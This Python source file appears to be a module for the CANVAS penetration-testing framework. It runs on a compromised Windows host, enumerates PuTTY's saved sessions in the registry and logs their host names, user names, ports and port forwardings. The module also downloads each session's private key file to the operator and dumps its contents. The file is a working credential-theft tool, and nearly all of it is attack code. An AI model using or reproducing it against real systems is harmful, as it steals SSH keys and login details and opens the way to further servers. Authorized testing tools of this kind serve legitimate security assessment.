#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

import struct
import re

NAME                = "get_putty_info"
DESCRIPTION         = "Get Putty stored sessions and keys"
VERSION             = "1.0"

PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Windows"] ]

DOCUMENTATION       = {}

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result             = ""
        self.supportedNodeTypes = ["win32Node", "win64Node"]
        self.name               = NAME
        self.knowledge_name     = 'putty_info'
        self.installed_updates = None
        self.sessions = {}
        
    def getargs(self):
        pass

    def is_putty_installed(self):
        """
        Check if Putty's registry key exists.
        """ 
        res = 0
        hKey = self.node.shell.RegOpenKeyEx("HKEY_CURRENT_USER",
                                            "SOFTWARE\\SimonTatham\\PuTTY", 
                                            "KEY_READ")
        if hKey == 0:            
            res = 0
        else:
            res = 1
            
        self.node.shell.RegCloseKey(hKey)
        return res
       
    def get_stored_sessions(self):
        """
        Get the stored sessions's information
        """
        hKey = self.node.shell.RegOpenKeyEx("HKEY_CURRENT_USER",
                                            "SOFTWARE\\SimonTatham\\PuTTY\\Sessions", 
                                            "KEY_READ")
        
        subKeys = self.node.shell.RegEnumKeyEx(hKey)
        self.node.shell.RegCloseKey(hKey)
        
        l = []
        for key in subKeys:
            self.log_info('Dumping session %s' % key)
            self.sessions[key] = {}
            hKey = self.node.shell.RegOpenKeyEx("HKEY_CURRENT_USER",
                                     "SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\" + key,
                                     "KEY_READ")
            ret,dtype,data = self.node.shell.RegQueryValueEx(hKey, "HostName")
            if ret != 0 and data:
                self.sessions[key]['HostName'] = data
                self.log_info('\tHostName: %s' % data)
                
            ret,dtype,data = self.node.shell.RegQueryValueEx(hKey, "UserName")
            if ret != 0 and data:
                self.sessions[key]['UserName'] = data
                self.log_info('\tUserName: %s' % data)
                    
            ret,dtype,data = self.node.shell.RegQueryValueEx(hKey, "PortNumber")
            if ret != 0 and dtype == 4:
                data = struct.unpack('<L',data)[0]
                self.sessions[key]['PortNumber'] = data
                self.log_info('\tPortNumber: %s' % data)
                
            ret,dtype,data = self.node.shell.RegQueryValueEx(hKey, "PortForwardings")
            if ret != 0 and data:
                self.sessions[key]['PortForwardings'] = data
                self.log_info('\tPortForwardings: %s' % data)
                
            ret,dtype,data = self.node.shell.RegQueryValueEx(hKey, "PublicKeyFile")
            if ret != 0 and data:
                self.sessions[key]['PublicKeyFile'] = data
                self.log_info('\tPublicKeyFile: %s' % data)
                keyfile_path = '%s.ppk' % key
                try:
                    self.node.shell.download(data, keyfile_path)
                
                    self.log_info('Downloading key file to %s' % keyfile_path)
                    
                    with open(keyfile_path, 'r') as keyfile:
                        keyfile_data = keyfile.readlines()
                        self.log_info('\tDumping key file info')
                        
                        for line in keyfile_data:
                            if ':' in line and 'Lines' not in line:
                                name, value = line.split(':')
                                self.log_info('\t\t %s : %s' % (name,value.strip()))
                except:
                    self.log_error('Failed to download the key file.')

            self.node.shell.RegCloseKey(hKey)


    def run(self):
        self.setInfo("%s (in progress)" % (NAME))

        self.node     = self.argsDict["passednodes"][0]
        self.nodetype = self.node.nodetype
        
        if self.nodetype not in ['win32Node','win64Node']:
            self.log_error('This module only works on Windows nodes.')
            return 0
        
        if self.is_putty_installed():
            self.log_info("Putty found on the target.")
            self.get_stored_sessions()        
        else:
            self.log_error("Putty doesn't seem to be installed on the target.")

        self.setInfo("%s - (finished)" % (NAME))
        return 1
